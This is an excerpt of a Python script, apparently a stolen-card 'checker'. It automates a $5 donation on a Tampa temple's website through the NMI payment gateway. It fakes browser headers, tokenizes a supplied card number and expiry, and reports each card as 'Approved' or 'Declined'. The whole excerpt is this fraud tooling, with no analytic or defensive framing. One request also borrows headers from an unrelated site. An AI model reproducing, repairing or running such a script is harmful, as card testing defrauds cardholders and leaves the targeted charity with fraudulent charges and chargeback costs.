    ...
    for _ in range(3):
        try:
            ...
            hdrs = {'User-Agent': ua, 'Accept': '*/*',
                    ...
                    'Origin': 'https://sanatanmandirtampa.org',
                    'Referer': 'https://sanatanmandirtampa.org/donations'}
            data = (f'ids%5B%5D={price_id}&totalPrice=5&qty%5B%5D=1&ctg%5B%5D=DONATIONS'
                    f'&serviceTypes%5B%5D=GENERAL+DONATIONS&serviceName%5B%5D=Any+Amount'
                    f'&serviceAmount%5B%5D=5.00&cart_type=DONATIONS&image%5B%5D=%2Fuploads'
                    f'%2Fprofile%2Fimage-1777881195809-92689595.png&description%5B%5D='
                    f'&cart_ctg%5B%5D=DONATIONS&service_desc%5B%5D=&isTextinputBox%5B%5D=NO')
            ...
            nhdrs = {'Host': 'secure.nmi.com', 'User-Agent': ua,
                     'Accept': 'application/json, text/plain, */*',
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Origin': 'https://sanatanmandirtampa.org',
                     'Referer': 'https://sanatanmandirtampa.org/'}
            r4     = sess.post('https://secure.nmi.com/token/api/create',
                               headers=nhdrs, data=f'tokenizationKey={_P_TOKEN1}&cartCorrelationId=&source=16',
                               timeout=20)
            p_tok  = _found(r4.text, '"token":"', '"')
            if not p_tok:
                return {'status': False, 'raise': 'No NMI token'}

            jhdrs = {'User-Agent': ua, 'Content-Type': 'application/json;charset=UTF-8',
                     'Accept': '*/*', 'Origin': 'https://secure.nmi.com',
                     'Referer': f'https://secure.nmi.com/token/inline.php?tokenizationKey={_P_TOKEN1}&cartCorrelationId=&token={p_tok}&elementId=ccnumber&title=Card%20Number&placeholder=Card%20Number&enableCardBrandPreviews=false'}
            sess.post('https://secure.nmi.com/token/api/save_multipart_token', headers=jhdrs, timeout=15,
                      json={'tokenizationKey': _P_TOKEN1, 'cartCorrelationId': '', 'tokenId': p_tok,
                            'data': [{'elementId': 'ccnumber', 'value': num}]})

            jhdrs['Referer'] = (f'https://secure.nmi.com/token/inline.php?tokenizationKey={_P_TOKEN1}'
                                f'&cartCorrelationId=&token={p_tok}&elementId=ccexp&title=Card%20Expiration&placeholder=MM%2FYY')
            sess.post('https://secure.nmi.com/token/api/save_multipart_token', headers=jhdrs, timeout=15,
                      json={'tokenizationKey': _P_TOKEN1, 'cartCorrelationId': '', 'tokenId': p_tok,
                            'data': [{'elementId': 'ccexp', 'value': f'{mes}{ano}'}]})

            lhdrs = {'Host': 'secure.nmi.com', 'User-Agent': ua,
                     'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json',
                     'Origin': 'https://compassionmobility.com', 'Referer': 'https://compassionmobility.com/'}
            sess.post('https://secure.nmi.com/token/api/lookup', headers=lhdrs, timeout=15,
                      json={'tokenId': p_tok, 'tokenizationKey': _P_TOKEN1, 'cartCorrelationId': ''})

            data = (f'token={p_tok}&totolAmt=5&name={fn}+{ln}&address={st}'
            ...
            return {'status': True, 'success': ok,
                    'response': f"{'Approved ✅' if ok else 'Declined ❌'} | {txt[:120]}"}
